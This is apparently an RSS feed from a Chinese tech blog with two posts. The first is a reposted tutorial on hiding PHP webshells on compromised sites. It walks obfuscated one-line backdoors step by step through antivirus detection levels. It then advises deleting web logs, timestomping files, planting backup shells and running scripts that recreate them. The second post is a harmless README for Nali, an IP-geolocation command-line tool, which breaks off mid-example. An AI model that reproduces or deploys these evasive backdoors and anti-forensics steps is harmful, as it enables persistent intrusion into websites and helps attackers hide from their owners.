<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>coding - 标签 - zu1k</title><link>https://lgf.im/tags/coding/</link><description>coding - 标签 - zu1k</description><generator>Hugo -- gohugo.io</generator><managingEditor>i@lgf.im (zu1k)</managingEditor><webMaster>i@lgf.im (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Sat, 08 Aug 2020 09:21:59 +0000</lastBuildDate><atom:link href="https://lgf.im/tags/coding/" rel="self" type="application/rss+xml"/><item><title>如何优雅的隐藏你的Webshell</title><link>https://lgf.im/posts/security/web-security/hide-your-webshell/</link><pubDate>Sat, 08 Aug 2020 09:21:59 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/hide-your-webshell/</guid><description><![CDATA[<blockquote>
<p>转自：酒仙桥六号部队 <a href="https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug">https://mp.weixin.qq.com/s/lExi2_y4NkTak735kpz4ug</a>
这个公众号的文章质量都非常高，推荐大家关注</p>
</blockquote>
<p>拿下一个站后总希望自己的后门能够很隐蔽！不让网站管理员或者其他的Hacker发现，网上关于隐藏后门的方法也很多，如加密、包含，解析漏洞、加隐藏系统属性等等，但大部分已经都不实用了，随便找一个查马的程序就能很快的查出来，下面分享我总结的一些经验：</p>
<h2 id="制作免杀webshell">制作免杀webshell</h2>
<p>隐藏webshell最主要的就是做免杀，免杀做好了，你可以把webshell放在函数库文件中或者在图片马中，太多地方可以放了，只要查杀工具查不到，你的这个webshell就能存活很长时间，毕竟管理员也没有那么多精力挨个代码去查看。</p>
<h3 id="命令执行的方法">命令执行的方法</h3>
<p>这里使用我们最常用的php的一句话马来给大家做演示，PHP版本是5.6的，在写一句话马之前我们来先分析一下PHP执行命令方法</p>
<h4 id="直接执行">直接执行</h4>
<p>使用php函数直接运行命令,常见的函数有(eval、system、assert)等，可以直接调用命令执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo 这是输出;&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h4 id="动态函数执行">动态函数执行</h4>
<p>我们先把一个函数名当成一个字符串传递给一个变量，在使用变量当作函数去执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;phpinfo&#34;</span><span class="p">;</span><span class="nv">$a</span><span class="p">();</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h4 id="文件包含执行">文件包含执行</h4>
<p>有两个php文件，我们把执行命令的放在文件b中，使用文件a去包含，达到执行的效果</p>
<p>b.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo 这是输出;&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p>a.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">include</span> <span class="nx">a</span><span class="o">.</span><span class="nx">php</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="回调函数">回调函数</h3>
<p>将想要执行命令的函数赋值给一个变量，再用一个可以调用函数执行的函数把变量解析成函数，这么说可能有点绕，看一下array_map函数的用法：array_map函数中将$arr每个元素传给func函数去执行，例子：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$func</span> <span class="o">=</span> <span class="s1">&#39;system&#39;</span><span class="p">;</span>
<span class="nv">$arr</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">);</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$func</span><span class="p">,</span> <span class="nv">$arr</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="php-curly-syntax">PHP Curly Syntax</h3>
<p>我们可以理解为字符串中掺杂了变量，再使用变量去拼接字符串，达到命令执行的效果</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;p&#39;</span><span class="p">;</span>
<span class="k">eval</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">{</span><span class="nv">$a</span><span class="si">}</span><span class="s2">hpinfo();&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="php反序列化">php反序列化</h3>
<p>这是根据php反序列化漏洞来实现命令执行，可以先创建一个反序列化的漏洞文件，再去调用反序列化函数unserialize</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$a</span><span class="o">=</span><span class="s2">&#34;123&#34;</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nx">unserialize</span><span class="p">(</span><span class="s1">&#39;O:4:&#34;test&#34;:1:{s:1:&#34;a&#34;;s:10:&#34;phpinfo();&#34;;}&#39;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="phpinput方法">php://input方法</h3>
<p>php://input可以访问请求的原始数据的只读流，我们可以理解为我们传post参数，php://input会读取到，这时候我们就可以加以利用了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;php://input&#39;</span><span class="p">));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="preg_replace方法">preg_replace方法</h3>
<p>preg_replace函数执行一个正则表达式的搜索和替换。我们可以使用一个命令执行函数去替换正常的字符串，然后去执行命令。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s2">&#34;/test/e&#34;</span><span class="p">,</span><span class="nx">phpinfo</span><span class="p">(),</span><span class="s2">&#34;jutst test&#34;</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<h3 id="ob_start">ob_start</h3>
<p>ob_start函数是打开输出控制缓冲，传入的参数会在使用ob_end_flush函数的时候去调用它执行输出在缓冲区的东西。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$cmd</span> <span class="o">=</span> <span class="s1">&#39;system&#39;</span><span class="p">;</span>
<span class="nx">ob_start</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
<span class="k">echo</span> <span class="s2">&#34;whoami&#34;</span><span class="p">;</span>
<span class="nx">ob_end_flush</span><span class="p">();</span><span class="c1">//输出全部内容到浏览器
</span></code></pre></td></tr></table>
</div>
</div><p></p>
<h2 id="编写免杀">编写免杀</h2>
<p>上面说了那么多其实都是一句话木马的思路，每一种方式都可以写成一句话木马，而想要免杀常常会多种组合到一起，下面从最简单的木马一步步变形，达到免杀的目的。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nx">assert</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>这种就是最简单的一句话木马，使用D盾扫一下，可以看到5级，没有什么好说的。</p>
<p>动态函数方法,把assert这个函数赋值两次变量,再把变量当成函数执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="nv">$c</span> <span class="o">=</span> <span class="s2">&#34;assert&#34;</span><span class="p">;</span>
<span class="nv">$c</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>回调函数方法，把assert函数当作参数传给array_map去调用执行。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$fun</span> <span class="o">=</span> <span class="s1">&#39;assert&#39;</span><span class="p">;</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$fun</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>可以看到上面的都是通过两种方法的结合，简单的处理一下，就变成了4级，感兴趣的可以把其他的方法都尝试一下，4级的很简单，我们去看看3级的都是怎么处理的</p>
<p>通过上面的动态函数方法我们可以思考，函数可以当成字符串赋值给变量，那么变量也一定能当成字符串赋值给变量，但调用时需要用$$</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;assert&#34;</span><span class="p">;</span>
<span class="nv">$c</span> <span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">;</span>
<span class="nv">$$c</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>我们在把这种方法结合到回调函数方法中，可以看到，已经是2级了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$fun</span> <span class="o">=</span> <span class="s1">&#39;assert&#39;</span><span class="p">;</span>
<span class="nv">$f</span> <span class="o">=</span> <span class="s1">&#39;fun&#39;</span><span class="p">;</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$$f</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>这时候我们看一下D盾中的说明：array_map中的参数可疑，我们这时候可以用函数封装一下参数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">function</span> <span class="nf">ass</span><span class="p">(){</span>
    <span class="nv">$a</span> <span class="o">=</span> <span class="s2">&#34;a451.ass.aaa.ert.adaww&#34;</span><span class="p">;</span>
    <span class="nv">$b</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
    <span class="nv">$c</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">.</span> <span class="nv">$b</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
    <span class="k">return</span> <span class="nv">$c</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">]);</span>
<span class="nv">$c</span> <span class="o">=</span> <span class="nx">ass</span><span class="p">();</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$c</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>1级了，离目标近在咫尺了，这时候我们应该考虑让一句话木马像正常的代码，在好好的封装一下</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">functiondownloadFile</span><span class="p">(</span><span class="nv">$url</span><span class="p">,</span><span class="nv">$x</span><span class="p">){</span>
    <span class="nv">$ary</span> <span class="o">=</span> <span class="nx">parse_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
    <span class="nv">$file</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$ary</span><span class="p">[</span><span class="s1">&#39;path&#39;</span><span class="p">]);</span>
    <span class="nv">$ext</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span><span class="nv">$file</span><span class="p">);</span>
    <span class="c1">// assert 
</span><span class="c1"></span>    <span class="nv">$exec1</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec2</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec3</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">5</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec4</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">4</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
    <span class="nv">$exec5</span><span class="o">=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$ext</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="mi">7</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
    <span class="nv">$as</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$exec1</span> <span class="o">.</span> <span class="nv">$exec2</span> <span class="o">.</span> <span class="nv">$exec3</span> <span class="o">.</span> <span class="nv">$exec4</span> <span class="o">.</span> <span class="nv">$exec5</span><span class="p">;</span>
    <span class="nv">$as</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$x</span><span class="p">;</span>
    <span class="k">return</span> <span class="nv">$as</span><span class="p">;</span>
<span class="p">}</span>

<span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;x&#39;</span><span class="p">];</span>
<span class="nv">$s</span> <span class="o">=</span> <span class="nx">downloadFile</span><span class="p">(</span><span class="s1">&#39;http://www.baidu.com/asdaesfrtafga.txt&#39;</span><span class="p">,</span><span class="nv">$a</span><span class="p">);</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="nv">$c</span> <span class="o">=</span> <span class="nv">$s</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="nx">array_map</span><span class="p">(</span><span class="nv">$b</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="nv">$c</span><span class="p">));</span>
</code></pre></td></tr></table>
</div>
</div><p></p>
<p>再试试其他免杀工具。</p>
<p>WebShellKiller：</p>
<p></p>
<p>安全狗：</p>
<p></p>
<p>微步云沙箱：</p>
<p></p>
<p>再试试可不可以连接没有问题，完美！！</p>
<p></p>
<h2 id="更好的隐藏webshell一些建议">更好的隐藏webshell一些建议</h2>
<ol>
<li>
<p>拿到权限以后,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除</p>
</li>
<li>
<p>把webshell的属性时间改为和同目录文件相同的时间戳,比如linux中的touch就是非常好的工具</p>
</li>
<li>
<p>目录层级越深越好,平时网站不出问题的话,一般四五级目录很少会被注意到,尽量藏在那些程序员和管理员都不会经常光顾的目录中比如:第三方工具的一些插件目录,主题目录,编辑器的图片目录以及一些临时目录</p>
</li>
<li>
<p>利用php.ini 配置文件隐藏webshell,把webshell的路径加入到配置文件中</p>
</li>
<li>
<p>尝试利用静态文件隐藏一句话,然后用.htaccess 规则进行解析</p>
</li>
<li>
<p>上传个精心构造的图片马,然后再到另一个不起眼的正常的网站脚本文件中去包含这个图片马</p>
</li>
<li>
<p>靠谱的方法就是直接把一句话插到正常的网站脚本文件里面,当然最好是在一个不起眼的地方,比如:函数库文件,配置文件里面等等,以及那些不需要经常改动的文件</p>
</li>
<li>
<p>如果有可能的话,还是审计下目标的代码,然后想办法在正常的代码中构造执行我们自己的webshell,即在原生代码中执行webshell</p>
</li>
<li>
<p>webshell里面尽量不要用类似eval这种过于敏感的特征,因为awk一句话就能查出来,除了eval,还有,比如:exec,system,passthru,shell_exec,assert这些函数都最好不要用,你可以尝试写个自定义函数,不仅能在一定程度上延长webshell的存活时间也加大了管理员的查找难度,也可以躲避一些功能比较简陋waf查杀,此外,我们也可以使用一些类似:call_user_func,call_user_func_array,诸如此类的回调函数特性来构造我们的webshell,即伪造正常的函数调用</p>
</li>
<li>
<p>webshell的名字千万不要太扎眼,比如:hack.php,sb.php,x.php这样的名字严禁出现……,在给webshell起名的时候尽量跟当前目录的,其他文件的名字相似度高一点,这样相对容易混淆视听,比如:目录中有个叫new.php的文件,那你就起个news.php</p>
</li>
<li>
<p>如果是大马的话,尽量把里面的一些注释和作者信息全部都去掉,比如intitle字段中的版本信息等等,用任何大马之前最好先好好的读几遍代码,把里面的shell箱子地址全部去掉推荐用开源的大马,然后自己拿过来仔细修改,记住,我们的webshell尽量不要用加密,因为加密并不能很好的解决waf问题,还有,大马中一般都会有个pass或者password字符,建议把这些敏感字段全部换成别的,因为利用这样的字符基本一句话就能定位到</p>
</li>
<li>
<p>养成一个好习惯,为了防止权限很快丢失,最好再同时上传几个备用webshell,注意,每个webshell的路径和名字千万不要都一样更不要在同一个目录下,多跳几层,记住,确定shell正常访问就可以了,不用再去尝试访问看看解析是否正常,因为这样就会在日志中留下记录,容易被查到</p>
</li>
<li>
<p>当然,如果在拿到服务器权限以后,也可以自己写个脚本每隔一段时间检测下自己的webshell是否还存在,不存在就创建</p>
</li>
<li>
<p>在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了</p>
</li>
</ol>
]]></description></item><item><title>Nali IP地理信息和CDN服务商查询</title><link>https://lgf.im/posts/coding/nali-golang/</link><pubDate>Fri, 17 Jul 2020 13:39:47 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/nali-golang/</guid><description><![CDATA[<p><a href="https://github.com/zu1k/nali" target="_blank" rel="noopener noreffer">Nali</a></p>
<blockquote>
<p>一个查询IP地理信息和CDN提供商的离线终端工具</p>
</blockquote>
<h2 id="来源">来源</h2>
<p>该工具受 <a href="https://github.com/meteoral/Nali" target="_blank" rel="noopener noreffer">Nali C版本</a> 和 <a href="https://github.com/SukkaW/nali-cli" target="_blank" rel="noopener noreffer">nali-cli js版本</a> 的启发.</p>
<p>我想要在终端对IP地理信息和CDN服务提供商进行查询，发现了Nali这个工具，Nali与哪里谐音，非常适合这类工具</p>
<p>经过简单的使用，我发现最初的C语言版本功能缺失，而苏卡卡大佬的js版本包实在大的恐怖、而支持的平台非常有限，所以我用golang重写了这个工具，在原有功能的基础上增加了对IPv6的支持，并且增加了Geoip2数据库</p>
<h2 id="功能">功能</h2>
<ul>
<li>纯真 IPv4 离线数据库</li>
<li>ZX IPv6 离线数据库</li>
<li>Geoip2 城市数据库 (可选)</li>
<li>IPIP 数据库 (可选)</li>
<li>CDN 服务提供商查询</li>
<li>支持管道处理</li>
<li>支持交互式查询</li>
<li>同时支持IPv4和IPv6</li>
<li>查询完全离线</li>
<li>全平台支持</li>
</ul>
<h2 id="安装">安装</h2>
<h3 id="从源码安装">从源码安装</h3>
<p>Nali 需要预先安装 Go. 安装后可以从源码安装软件:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-sh" data-lang="sh">$ go get -u -v github.com/zu1k/nali
</code></pre></td></tr></table>
</div>
</div><h3 id="下载预编译的可执行程序">下载预编译的可执行程序</h3>
<p>可以从Release页面下载预编译好的可执行程序: <a href="https://github.com/zu1k/nali/releases" target="_blank" rel="noopener noreffer">Release</a></p>
<p>你需要选择适合你系统和硬件架构的版本下载，解压后可直接运行</p>
<h3 id="使用-docker-版本">使用 Docker 版本</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">docker pull docker.pkg.github.com//zu1k/nali/nali:latest
</code></pre></td></tr></table>
</div>
</div><h2 id="使用说明">使用说明</h2>
<p><a href="https://asciinema.org/a/RFVaZ3Pwy0Qbr27msFcDYhwcD" target="_blank"></a></p>
<h3 id="查询一个ip的地理信息">查询一个IP的地理信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali 1.2.3.4
1.2.3.4 [澳大利亚 APNIC Debogon-prefix网络]
</code></pre></td></tr></table>
</div>
</div><h4 id="或者-使用-管道">或者 使用 <code>管道</code></h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ echo IP 6.6.6.6 | nali
IP 6.6.6.6 [美国 亚利桑那州华楚卡堡市美国国防部网络中心]
</code></pre></td></tr></table>
</div>
</div><h3 id="同时查询多个ip的地理信息">同时查询多个IP的地理信息</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali 1.2.3.4 4.3.2.1 123.23.3.0
1.2.3.4 [澳大利亚 APNIC Debogon-prefix网络]
4.3.2.1 [美国 新泽西州纽瓦克市Level3Communications]
123.23.3.0 [越南 越南邮电集团公司]
</code></pre></td></tr></table>
</div>
</div><h3 id="交互式查询">交互式查询</h3>
<p>使用 <code>exit</code> 或  <code>quit</code> 退出查询</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nali
123.23.23.23
123.23.23.23 [越南 越南邮电集团公司]
1.0.0.1
1.0.0.1 [美国 APNIC&amp;CloudFlare公共DNS服务器]
8.8.8.8
8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器]
quit
</code></pre></td></tr></table>
</div>
</div><h3 id="与-dig-命令配合使用">与 <code>dig</code> 命令配合使用</h3>
<p>需要你系统中已经安装好 dig 程序</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ dig nali.lgf.im +short | nali
104.28.2.115 [美国 CloudFlare公司CDN节点]
104.28.3.115 [美国 CloudFlare公司CDN节点]
172.67.135.48 [美国 CloudFlare节点]
</code></pre></td></tr></table>
</div>
</div><h3 id="与-nslookup-命令配合使用">与 <code>nslookup</code> 命令配合使用</h3>
<p>需要你系统中已经安装好 nslookup 程序</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">$ nslookup nali.lgf.im 8.8.8.8 | nali
Server:         8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器]
Address:        8.8.8.8 [美国 加利福尼亚州圣克拉拉县山景市谷歌公司DNS服务器]#53

Non-authoritative answer:
Name:   nali.lgf.im
Address: 104.28.3.115 [美国 CloudFlare公司CDN节点]
Name:   nali.lgf.im
Address: 104.28.2.115 [美国 CloudFlare公司CDN节点]
Name:   nali.lgf.im
Address: 172.67.135.48 [美国 CloudFlare节点]
</code></pre></td></tr></table>
</div>
</div><h3 id="与任意程序配合使用">与任意程序配合使用</h3>
<p>因为 nali 支持管道处理，所以可以和任意程序配合使用</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-fallback" data-lang="fallback">bash abc.sh | nali
</code></pre></td></tr></table>
</div>
</div><p>Nali 将在 IP后面插入IP地理信息，CDN域名后面插入CDN服务提供商信息</p>
<h3 id="支持ipv6">支持IPv6</h3>
<p>和 IPv4 用法完全相同</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
